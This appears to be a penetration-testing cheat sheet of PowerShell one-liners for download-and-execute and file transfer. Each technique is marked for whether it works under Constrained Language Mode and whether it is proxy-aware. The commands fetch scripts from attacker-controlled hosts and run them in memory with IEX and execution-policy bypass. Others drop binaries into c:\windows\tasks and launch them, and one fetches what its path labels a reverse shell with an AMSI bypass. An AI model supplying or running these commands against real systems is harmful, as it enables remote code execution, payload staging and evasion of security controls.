## Download/Execute in Memory

### Load Powershell Script directly into memory: 
Works in CLM | Proxy Aware 
-------|---------
[ ] | [ X ]   

```
$str = "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.121/getuser.ps1') | IEX"
Invoke-Expression $str
```


### Load Powershell Script directly into memory: 
Works in CLM | Proxy Aware 
-------|---------
[ ] | [ X ]

```
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.22.55/run.txt'))
```


## Download Files

###  System.Net.Http Download Files
Works in CLM | Proxy Aware 
-------|---------
[ ] | [ X ]

```
Add-Type -AssemblyName System.Net.Http;$a=(New-Object System.Net.Http.HttpClient).getasync('http://192.168.22.55/issue.hta'); $a.wait();$o=[System.IO.FileStream]::new('c:\windows\tasks\test.txt', [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write);$a.Result.Content.CopyToAsync($o).Wait();$o.close()
```

### System.net.WebClient DownloadFile
Works in CLM | Proxy Aware 
-------|---------
[ ] | [ X ]

```
(new-object System.Net.WebClient).downloadFile('http://192.168.22.55/test.txt','c:\windows\tasks\test.txt')
```


### Invoke-RestMethod
Works in CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]
```
Invoke-RestMethod -Uri http://192.168.22.55/tete.exe -OutFile c:\windows\tasks\test.txt
Start-Process -FilePath "Purecsrunner.exe"
```

### Invoke-WebRequest
Works in CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
Invoke-WebRequest -Uri 'http://192.168.22.55/Purecsrunner.exe' -OutFile 'Purecsrunner.exe'
Start-Process -FilePath "Purecsrunner.exe"
```

### Powershell IWR
Works in CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
```

### Powershell-Wget
Works in CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
powershell wget http://192.168.22.55/psscripts/PlainRS-wAmsiByp/rshell-am.txt -outfile c:\windows\tasks\test.exe
```

### Start-bitstransfer
Works in CLM | Proxy Aware 
-------|---------
[ X ] | [ X ]

```
powershell -c "start-bitstransfer -source http://192.168.22.55/some.exe c:\windows\tasks\some.exe"
```
